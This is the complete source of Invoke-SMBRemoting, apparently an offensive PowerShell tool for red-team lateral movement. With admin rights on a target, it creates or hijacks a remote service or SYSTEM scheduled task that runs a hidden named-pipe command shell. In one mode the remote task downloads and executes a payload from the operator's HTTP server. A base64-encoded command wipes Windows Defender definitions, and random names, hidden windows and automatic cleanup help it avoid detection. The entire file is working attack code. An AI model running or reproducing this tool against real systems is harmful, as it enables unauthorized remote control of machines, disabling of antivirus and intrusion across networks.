function Invoke-SMBRemoting {
	
	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting

	.DESCRIPTION
	Interactive Shell and Command Execution over Named-Pipes (SMB) for Fileless lateral movement.

 	.REQUIREMENTS
	Admin rights over the target Host
	
	.PARAMETER ComputerName
	The Server HostName or IP to connect to
	
	.PARAMETER PipeName
	Specify the Pipe Name
	
	.PARAMETER ServiceName
	Specify the Service Name
	
	.PARAMETER Command
	Specify a command to run instead of getting a Shell
	
	.PARAMETER Timeout
	Specify a Timeout after which the script will stop waiting for a connection
	
	.PARAMETER ModifyService
	Modify an existing service instead of creating a new one. If no target service is specified SensorService is targeted
	
	.PARAMETER AsTask
	Will create and run a task on remote target instead of a service
	
	.PARAMETER AsUser
	Run the task as current user, not SYSTEM
	
	.PARAMETER IP
	IP to serve the Task script from
	
	.PARAMETER Port
	Port to serve the Task script from
	
	.PARAMETER Purge
	Purge AV definitions on target host
	
	.PARAMETER Verbose
	Show Pipe and Service Name info
	
	.EXAMPLE
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask -AsUser
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -PipeName Something -ServiceName RandomService
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -Command "whoami /all"
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -Verbose
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -ServiceName SensorService -Verbose
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -Command "whoami /all"
	
	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "30000",
		[string]$IP,
		[int]$Port = 8080,
		[switch]$ModifyService,
		[switch]$Purge,
		[switch]$AsTask,
		[switch]$AsUser,
		[switch]$Verbose
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	if (-not $ComputerName) {
		Write-Output "[-] Please specify a Target"
		Write-Output ""
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(($ServiceName -AND $AsTask) -OR ($ModifyService -AND $AsTask)){
		Write-Output "[-] Running as Task or Service ? Please review your command"
		Write-Output ""
		return
	}
	
	if($AsUser -AND !$AsTask){
		Write-Output "[-] Running -AsUser requires -AsTask. Please review your command"
		Write-Output ""
		return
	}
	
	if(!$ServiceName -AND !$ModifyService -AND !$AsTask){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	elseif(!$ServiceName -AND $ModifyService -AND !$AsTask){
		$ServiceName = "SensorService"
	}
	
	elseif($AsTask){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$TaskName = "Task_" + $randomvalue
	}

 	$trigtgs = '\\' + $ComputerName + '\c$'
	$Error.clear()
   	ls $trigtgs | Out-Null
	if($Error[0]){
		if($Error -match "Access is denied"){
			Write-Output "[-] Access is denied"
			Write-Output ""
		} else {
			Write-Output "[-] $Error"
			Write-Output ""
		}
		break
	}
	
	if($Purge){
		
		if($AsTask){
			if($Verbose){
				Write-Output "[+] Task Name: $TaskName"
				Write-Output "[+] Creating Task on Remote Target..."
			}
			
			schtasks /create /S $ComputerName /SC Weekly /RU "NT Authority\SYSTEM" /TN $TaskName /TR "powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==" | Out-Null
			
			if($Verbose){
				Write-Output "[+] Task created on Remote Target"
			}
			
			Start-Sleep -Milliseconds 1000
			
			schtasks /Run /S $ComputerName /TN $TaskName | Out-Null
			
			if($Verbose){
				Write-Output "[+] Task started on Remote Target"
			}
			
			Start-Sleep -Milliseconds 3000
			
			schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null
			
			if($Verbose){
				Write-Output "[+] Task deleted on Remote Target"
			}
			
			Write-Output "[+] Done"
			
			Write-Output ""
			
			break
		}
		
		else{
		
			if($Verbose){
				Write-Output "[+] Service Name: $ServiceName"
				Write-Output "[+] Creating Service on Remote Target..."
			}
			
			$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
		
			$startarguments = "\\$ComputerName start $ServiceName"
			
			Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
			
			if($Verbose){
				Write-Output "[+] Service created"
			}
			
			Start-Sleep -Milliseconds 1000
			
			Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
			
			if($Verbose){
				Write-Output "[+] Service started"
			}
			
			Start-Sleep -Milliseconds 3000
			
			$stoparguments = "\\$ComputerName delete $ServiceName"
			
			Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
			
			if($Verbose){
				Write-Output "[+] Service deleted"
			}
			
			Write-Output "[+] Done"
			
			Write-Output ""
			
			break
		}
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$tcb={param(`$state);`$state.Close()};
`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
`$pipeServer.WaitForConnection()
`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
`$tm.Dispose();
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	if($AsTask){
		$ipaddress = (Resolve-DnsName -Name $ComputerName -Type A).IPAddress
		
		if(!$IP){
			$PossibleIPAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
				Where-Object { $_.InterfaceAlias -notlike 'Loopback*' -and 
							   ($_.IPAddress.StartsWith("10.") -or 
								$_.IPAddress -match "^172\.(1[6-9]|2[0-9]|3[0-1])\." -or 
								$_.IPAddress.StartsWith("192.168.")) } | 
				Select-Object -Property IPAddress -ExpandProperty IPAddress
			
			if($PossibleIPAddresses.count -gt 1){
				# split the target’s IP into octets
				$targetOctets = $ipaddress.Split('.')
				$bestIP     = $null
				$bestMatch  = -1
				
				foreach ($candidate in $PossibleIPAddresses) {
					$candOctets = $candidate.Split('.')
					$matchCount = 0

					for ($i = 0; $i -lt 4; $i++) {
						if ($candOctets[$i] -eq $targetOctets[$i]) {
							$matchCount++
						}
						else {
							break
						}
					}

					if ($matchCount -gt $bestMatch) {
						$bestMatch = $matchCount
						$bestIP    = $candidate
					}
				}

				# bestIP is the one sharing the most left-hand octets with the target
				$IP = $bestIP
			}
			
			elseif($PossibleIPAddresses.count -eq 0){
				$UserDefinedIP = Read-Host "[-] We could not determine your IP address, please specify it"
				if($UserDefinedIP){$IP = $UserDefinedIP}
				else{
					Write-Output "[-] IP address not defined. Run without the -AsTask flag. Quitting..."
					Write-Output ""
					break
				}
			}
			
			else{$IP = $PossibleIPAddresses}
		}
		
		$FileServerScript = @"
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

public class SimpleFileServer
{
    public TcpListener Listener { get; private set; }

    public SimpleFileServer(IPAddress address, int port)
    {
        Listener = new TcpListener(address, port);
    }

    public async Task StartAsync()
    {
        Listener.Start();
        Console.WriteLine("Listening on " + Listener.LocalEndpoint);

        while (true)
        {
            var client = await Listener.AcceptTcpClientAsync();
            // queue on the CLR thread‐pool and block that thread on the async handler
            System.Threading.ThreadPool.QueueUserWorkItem(state =>
            {
                var c = (TcpClient)state;
                HandleClientAsync(c).GetAwaiter().GetResult();
            }, client);
        }
    }

    private async Task HandleClientAsync(TcpClient client)
    {
        var endpoint = client.Client.RemoteEndPoint.ToString();
        Console.WriteLine("Client connected: " + endpoint);

        using (client)
        using (var stream = client.GetStream())
        using (var reader = new StreamReader(stream))
        using (var writer = new StreamWriter(stream))
        {
            string requestLine = await reader.ReadLineAsync();
            Console.WriteLine(requestLine);
            if (requestLine == null)
                return;

            var parts = requestLine.Split(' ');
            if (parts.Length >= 2
                && parts[0] == "GET"
                && parts[1].Equals("/taskscript.ps1", StringComparison.OrdinalIgnoreCase))
            {
                var contentString = "$B64ServerScript";
                var contentBytes = Encoding.UTF8.GetBytes(contentString);

                writer.WriteLine("HTTP/1.1 200 OK");
                writer.WriteLine("Content-Type: text/plain");
                writer.WriteLine("Content-Length: " + contentBytes.Length);
                writer.WriteLine("Connection: close");
                writer.WriteLine("");
                await writer.FlushAsync();

                await stream.WriteAsync(contentBytes, 0, contentBytes.Length);
            }
            else
            {
                writer.WriteLine("HTTP/1.1 404 Not Found");
                writer.WriteLine("Connection: close");
                writer.WriteLine("");
                await writer.FlushAsync();
            }
        }
    }
}
'@ -Language CSharp

`$server = New-Object SimpleFileServer ([System.Net.IPAddress]::Any, $Port)
`$server.StartAsync().Wait()
"@

		$b64FileServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FileServerScript))
	
		$FileServerProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64FileServerScript" -WindowStyle Hidden -PassThru
		
		if($Verbose){
			Write-Output "[+] Serving address: $($IP):$($Port)"
			Write-Output "[+] Server script PID: $($FileServerProcess.Id)"
			Write-Output "[+] Pipe Name: $PipeName"
			Write-Output "[+] Task Name: $TaskName"
			Write-Output "[+] Creating Task on Remote Target"
		}
		
		$taskcommand = "`$b64scrpt=irm http://$($IP):$($Port)/taskscript.ps1;`$dec=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$b64scrpt));iex `$dec"
		
		if($AsUser){
			schtasks /create /S $ComputerName /SC Weekly /TN $TaskName /TR "powershell.exe -WindowStyle Hidden -c '$taskcommand'" | Out-Null
		}
		
		else{
			schtasks /create /S $ComputerName /SC Weekly /RU "NT Authority\SYSTEM" /TN $TaskName /TR "powershell.exe -c '$taskcommand'" | Out-Null
		}
		
		if($Verbose){
			Write-Output "[+] Task created on Remote Target"
		}
		
		schtasks /Run /S $ComputerName /TN $TaskName | Out-Null
		
		if($Verbose){
			Write-Output "[+] Task started on Remote Target"
		}
	}
	
	elseif($ModifyService){
		
		$originalBinPath = & sc.exe \\$ComputerName qc $ServiceName | Select-String "BINARY_PATH_NAME" | ForEach-Object {$_.ToString().Split(":", 2)[1].Trim()}
		
		$arguments = "\\$ComputerName config $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
		
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
		# Optional: Restart the service to apply the changes
		$stopArguments = "\\$ComputerName stop $ServiceName"
		$startArguments = "\\$ComputerName start $ServiceName"
		
		# Stop the service
		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	}
	
	else{
		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
		$startarguments = "\\$ComputerName start $ServiceName"
		
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	}
	
	if($Verbose -AND !$AsTask){
		if($ModifyService){
			Write-Output "[+] Pipe Name: $PipeName"
			Write-Output "[+] Service Name: $ServiceName"
			Write-Output "[+] Original binPath: $originalBinPath"
			Write-Output "[+] Modifying Service on Remote Target..."
			Write-Output ""
		}
		else{
			Write-Output "[+] Pipe Name: $PipeName"
			Write-Output "[+] Service Name: $ServiceName"
			Write-Output "[+] Creating Service on Remote Target..."
			Write-Output ""
		}
	}
	
	# Get the current process ID
	$currentPID = $PID
	$servertargetpid = $FileServerProcess.Id
	
	if($AsTask){
	# Embedded monitoring script
	$monitoringScript = @"
`$TargetServer = "$ComputerName"
`$TargetTask = "$TaskName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the task
		schtasks /delete /S `$TargetServer /TN `$TargetTask /f
		sleep 1
		Stop-Process -Id $servertargetpid
		sleep 1
		break # Exit the monitoring script
	}
}
"@}
	
	elseif($ModifyService -AND !$AsTask){
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID
`$BinPath = "$originalBinPath"

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, stop the service
		`$stoparguments = "\\`$TargetServer stop `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		`$arguments = "\\`$TargetServer config `$serviceToDelete binpath= `$BinPath"
		Start-Process sc.exe -ArgumentList `$arguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@}
	else{
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@}
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	$MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out | Try again with -Timeout 60000"
		Write-Output ""
		if($AsTask){
			Stop-Process -Id $FileServerProcess.Id
			schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null
			Stop-Process -Id $MonitoringProcess.Id
		}
		elseif($ModifyService -AND !$AsTask){
			$stopArguments = "\\$ComputerName stop $ServiceName"
			Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
			$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
			Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
			Stop-Process -Id $MonitoringProcess.Id
		}
		else{
			$stoparguments = "\\$ComputerName delete $ServiceName"
			Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
			Stop-Process -Id $MonitoringProcess.Id
		}
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		if($AsTask){
			Stop-Process -Id $FileServerProcess.Id
			schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null
			Stop-Process -Id $MonitoringProcess.Id
		}
		elseif($ModifyService -AND !$AsTask){
			$stopArguments = "\\$ComputerName stop $ServiceName"
			Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
			$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
			Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
			Stop-Process -Id $MonitoringProcess.Id
		}
		else{
			$stoparguments = "\\$ComputerName delete $ServiceName"
			Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
			Stop-Process -Id $MonitoringProcess.Id
		}
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	if($AsTask){
		Stop-Process -Id $FileServerProcess.Id
		if($Verbose){Write-Output "[+] Server script killed";Write-Output ""}
	}
	
	if ($Command) {
		$Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
		$Command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
		$fullCommand = "$Command 2>&1 | Out-String"
		$sw.WriteLine($fullCommand)
		$sw.Flush()
		while ($true) {
			$line = $sr.ReadLine()
			if ($line -eq "###END###") {
				Write-Output $serverOutput.Trim()
				Write-Output ""
				break
			} else {
				$serverOutput += "$line`n"
			}
		}
	} 
	
	else {
		while ($true) {
			
			# Fetch the actual remote prompt
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			$remotePath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					# Remove any extraneous whitespace, newlines etc.
					$remotePath = $remotePath.Trim()
					break
				} else {
					$remotePath += "$line`n"
				}
			}
			$ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
   			if($ComputerName -match $ipPattern){$computerNameOnly = $ComputerName}
      			else{$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1}
			$promptString = "[$computerNameOnly]: $remotePath "
			Write-Host -NoNewline $promptString
			$userCommand = Read-Host
			
			if ($userCommand -eq "exit") {
				Write-Output ""
					$sw.WriteLine("exit")
				$sw.Flush()
				break
			}
			
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand 2>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
			
			else{
				continue
			}

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
				}
			}
		}
	}
	
	if($AsTask){
		schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null
	}
	
	elseif($ModifyService -AND !$AsTask){
		$stopArguments = "\\$ComputerName stop $ServiceName"
		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
		$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
	}
	else{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
	}
	
	$pipeClient.Close()
	$pipeClient.Dispose()
	Stop-Process -Id $MonitoringProcess.Id
}